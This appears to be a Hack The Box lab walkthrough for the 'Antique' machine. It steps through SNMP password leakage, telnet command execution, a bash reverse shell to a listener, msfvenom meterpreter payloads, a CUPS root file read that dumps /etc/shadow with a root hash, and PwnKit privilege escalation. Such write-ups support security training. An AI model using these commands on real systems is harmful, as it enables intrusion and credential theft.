Antique IP:10.10.11.107



rustscan:

PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack


nmap:

PORT   STATE SERVICE REASON  VERSION
23/tcp open  telnet? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.91%I=7%D=2/16%Time=63EE5574%P=x86_64-pc-linux-gnu%r(NULL
SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
SF:irect\n\nPassword:\x20");






sudo nmap -sU -sC  -sV -p160-170  10.10.11.107                                                                                                                                             1 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 11:16 EST
Nmap scan report for 10.10.11.107
Host is up (0.057s latency).

PORT    STATE  SERVICE     VERSION
160/udp closed sgmp-traps
161/udp open   snmp        SNMPv1 server (public)
162/udp closed snmptrap
163/udp closed cmip-man
164/udp closed smip-agent
165/udp closed xns-courier
166/udp closed s-net
167/udp closed namp
168/udp closed rsvd
169/udp closed send
170/udp closed print-srv

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds


found an exploit: https://www.exploit-db.com/exploits/22319

                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Practice/HackTheBox/Antique]
└─$ snmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0                                                                                                                       127 ⨯
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 


we can translate the output using cyberchef from hex:

P@ssw0rd@123!!123..	..."#%&'01345789BCIPQTWXaetuy...................	..............

we can log on to telnet


telnet 10.10.11.107 
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?   

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session


we can run some commands:

> exec whoami
lp
> exec cat user.txt
b5e9de029bb113587c3d23ea80dffc50


Foothold:

> exec bash -c 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'

start nc listener:


                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Practice/HackTheBox/Antique]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.107] 60732
bash: cannot set terminal process group (1008): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ 


PRIVESC:


lp@antique:~$ netstat -tulpn | grep LISTEN
netstat -tulpn | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1020/python3        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
lp@antique:~$ 


There is something on port 631

Port 631 is open, which we can check what it means – https://www.speedguide.net/port.php?port=631. It will likely be IPP – Internet Printing Protocol. On the site https://book.hacktricks.xyz/pentesting/pentesting-631-internet-printing-protocol-ipp, we can find out that IPP is based on HTTP, which means we will treat it as a website for now.


lp@antique:~$ wget http://localhost:631
wget http://localhost:631
--2023-02-16 16:33:21--  http://localhost:631/
Resolving localhost (localhost)... 127.0.0.1
Connecting to localhost (localhost)|127.0.0.1|:631... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3792 (3.7K) [text/html]
Saving to: ‘index.html’

index.html          100%[===================>]   3.70K  --.-KB/s    in 0s      

2023-02-16 16:33:21 (1.17 GB/s) - ‘index.html’ saved [3792/3792]



let read the file to see what it;'s running'

lp@antique:~$ cat index.html
cat index.html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Home - CUPS 1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
        <LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>
<BODY>
<TABLE CLASS="page" SUMMARY="{title}">
<TR><TD CLASS="body">
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0" SUMMARY="">
<TR HEIGHT="36">
<TD><A HREF="http://www.cups.org/" TARGET="_blank"><IMG
SRC="/images/left.gif" WIDTH="64" HEIGHT="36" BORDER="0" ALT=""></A></TD>
<TD CLASS="sel"><A HREF="/">&nbsp;&nbsp;Home&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/admin">&nbsp;&nbsp;Administration&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/classes/">&nbsp;&nbsp;Classes&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/help/">&nbsp;&nbsp;Online&nbsp;Help&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/jobs/">&nbsp;&nbsp;Jobs&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel"><A HREF="/printers/">&nbsp;&nbsp;Printers&nbsp;&nbsp;</A></TD>
<TD CLASS="unsel" WIDTH="100%"><FORM ACTION="/help/" METHOD="GET"><INPUT
TYPE="SEARCH" NAME="QUERY" SIZE="20" PLACEHOLDER="Search Help"
AUTOSAVE="org.cups.help" RESULTS="20"></FORM></TD>
<TD><IMG SRC="/images/right.gif" WIDTH="4" HEIGHT="36" ALT=""></TD>
</TR>
</TABLE>

<TABLE CLASS="indent" SUMMARY="">
<TR><TD STYLE="padding-right: 20px;">

<H1>CUPS 1.6.1</H1>

<P>CUPS is the standards-based, open source printing system developed by
<A HREF="http://www.apple.com/">Apple Inc.</A> for OS<SUP>&reg;</SUP> X and
other UNIX<SUP>&reg;</SUP>-like operating systems.</P>

</TD>
<TD><A HREF="http://www.cups.org/"><IMG SRC="images/cups-icon.png" WIDTH="128"
HEIGHT="128" ALT="CUPS"></A></TD>
</TR>
</TABLE>

<TABLE CLASS="indent" SUMMARY="">
<TR><TD VALIGN="top" STYLE="border-right: dotted thin #cccccc; padding-right: 20px;">

<H2>CUPS for Users</H2>

<P><A HREF="help/overview.html">Overview of CUPS</A></P>

<P><A HREF="help/options.html">Command-Line Printing and Options</A></P>

<P><A HREF="help/whatsnew.html">What's New in CUPS 1.6</A></P>

<P><A HREF="http://www.cups.org/newsgroups.php?gcups.general">User Forum</A></P>

</TD><TD VALIGN="top" STYLE="border-right: dotted thin #cccccc; padding-left: 20px; padding-right: 20px;">

<H2>CUPS for Administrators</H2>

<P><A HREF="admin">Adding Printers and Classes</A></P>

<P><A HREF="help/policies.html">Managing Operation Policies</A></P>

<P><A HREF="help/accounting.html">Printer Accounting Basics</A></P>

<P><A HREF="help/security.html">Server Security</A></P>

<P><A HREF="help/kerberos.html">Using Kerberos Authentication</A></P>

<P><A HREF="help/network.html">Using Network Printers</A></P>

<P><A HREF="help/ref-cupsd-conf.html">cupsd.conf Reference</A></P>

<P><A HREF="http://www.cups.org/ppd.php">Find Printer Drivers</A></P>

</TD><TD VALIGN="top" STYLE="padding-left: 20px;">

<H2>CUPS for Developers</H2>

<P><A HREF="help/api-overview.html">Introduction to CUPS Programming</A></P>

<P><A HREF="help/api-cups.html">CUPS API</A></P>

<P><A HREF="help/api-filter.html">Filter and Backend Programming</A></P>

<P><A HREF="help/api-httpipp.html">HTTP and IPP APIs</A></P>

<P><A HREF="help/api-ppd.html">PPD API</A></P>

<P><A HREF="help/api-raster.html">Raster API</A></P>

<P><A HREF="help/ref-ppdcfile.html">PPD Compiler Driver Information File Reference</A></P>

<P><A HREF="http://www.cups.org/newsgroups.php?gcups.development">Developer Forum</A></P>

</TD></TR>
</TABLE>

</TD></TR>
<TR><TD>&nbsp;</TD></TR>
<TR><TD CLASS="trailer">CUPS and the CUPS logo are trademarks of
<A HREF="http://www.apple.com">Apple Inc.</A> CUPS is copyright 2007-2012 Apple
Inc. All rights reserved.</TD></TR>
</TABLE>
</BODY>
</HTML>


So, it CUPS

Let's search for an exploit:

 msfconsole -q                            
msf6 > search CUPS

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  post/multi/escalate/cups_root_file_read  2012-11-20       normal     No     CUPS 1.6.1 Root File Read
   1  exploit/multi/http/cups_bash_env_exec    2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/cups_bash_env_exec

msf6 > 


first exploit displayed starts with post, which means it has to run locally, and a session would be needed for it to work. Then let’s do it. We will use msfvenom, and create a meterpreter session.

let's create a meterpreter session:
──(kali㉿kali)-[~/Practice/HackTheBox/Antique]
└─$  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1337 --format elf > shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes

upload the shell on then machine , give it permission to run and set up an multi handler

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/shell_reverse_tcp
[-] The value specified for payload is not valid.
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.9       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.9:1337 
[*] Sending stage (3045348 bytes) to 10.10.11.107
[*] Meterpreter session 1 opened (10.10.14.9:1337 -> 10.10.11.107:35872) at 2023-02-16 11:41:04 -0500

meterpreter > 





msf6 > search CUPS

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  post/multi/escalate/cups_root_file_read  2012-11-20       normal     No     CUPS 1.6.1 Root File Read
   1  exploit/multi/http/cups_bash_env_exec    2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/cups_bash_env_exec

msf6 > use 0
msf6 post(multi/escalate/cups_root_file_read) > show options

Module options (post/multi/escalate/cups_root_file_read):

   Name       Current Setting          Required  Description
   ----       ---------------          --------  -----------
   ERROR_LOG  /var/log/cups/error_log  yes       The original path to the CUPS error log
   FILE       /etc/shadow              yes       The file to steal.
   SESSION                             yes       The session to run this module on

msf6 post(multi/escalate/cups_root_file_read) > sessions -i

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  1         meterpreter x64/linux  lp @ 10.10.11.107  10.10.14.9:1337 -> 10.10.11.107:35872 (10.10.11.107)

msf6 post(multi/escalate/cups_root_file_read) > set session 1
session => 1
msf6 post(multi/escalate/cups_root_file_read) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session type: meterpreter
[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[+] nc binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /etc/shadow (998 bytes) saved to /home/kali/.msf4/loot/20230216114230_default_10.10.11.107_cups_file_read_694150.bin
[*] Cleaning up...
[*] Post module execution completed
msf6 post(multi/escalate/cups_root_file_read) > set file /root/root.txt
file => /root/root.txt
msf6 post(multi/escalate/cups_root_file_read) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session type: meterpreter
[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[+] nc binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /root/root.txt (32 bytes) saved to /home/kali/.msf4/loot/20230216114312_default_10.10.11.107_cups_file_read_525614.txt
[*] Cleaning up...
[*] Post module execution completed




shadow file:
cat /home/kali/.msf4/loot/20230216114230_default_10.10.11.107_cups_file_read_694150.bin
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7::: 


root flag:0e879ec467b918e267e2e038aaf9053c  





beyond :

msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.11.107 - Collecting local exploits for x64/linux...
[*] 10.10.11.107 - 173 exploit checks are being tried...
[+] 10.10.11.107 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 10.10.11.107 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.13.0
[+] 10.10.11.107 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 10.10.11.107 - exploit/linux/local/netfilter_nft_set_elem_init_privesc: The target appears to be vulnerable.
[+] 10.10.11.107 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 10.10.11.107 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 10.10.11.107 - exploit/linux/local/sudo_baron_samedit: The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[+] 10.10.11.107 - exploit/linux/local/ubuntu_enlightenment_mount_priv_esc: The target appears to be vulnerable.
[*] Running check method for exploit 56 / 56
[*] 10.10.11.107 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 2   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.13.0
 3   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 4   exploit/linux/local/netfilter_nft_set_elem_init_privesc             Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 6   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/sudo_baron_samedit                              Yes                      The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
 8   exploit/linux/local/ubuntu_enlightenment_mount_priv_esc             Yes                      The target appears to be vulnerable.





 Getting root:

 msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec 
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > show options

Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PKEXEC_PATH                    no        The path to pkexec binary
   SESSION                        yes       The session to run this module on
   WRITABLE_DIR  /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   x86_64


msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set session 1
session => 1
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 9002
LPORT => 9002
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
\
[*] Started reverse TCP handler on 10.10.14.9:9002 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.nwzgauyf
[+] The target is vulnerable.
[*] Writing '/tmp/.btbqrv/muykxmjdg/muykxmjdg.so' (548 bytes) ...
[!] Verify cleanup of /tmp/.btbqrv
[*] Sending stage (3045348 bytes) to 10.10.11.107
[+] Deleted /tmp/.btbqrv/muykxmjdg/muykxmjdg.so
[+] Deleted /tmp/.btbqrv/.akbakmbf
[+] Deleted /tmp/.btbqrv
[*] Meterpreter session 2 opened (10.10.14.9:9002 -> 10.10.11.107:46598) at 2023-02-16 11:57:06 -0500

meterpreter > id
[-] Unknown command: id
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: root
meterpreter > 
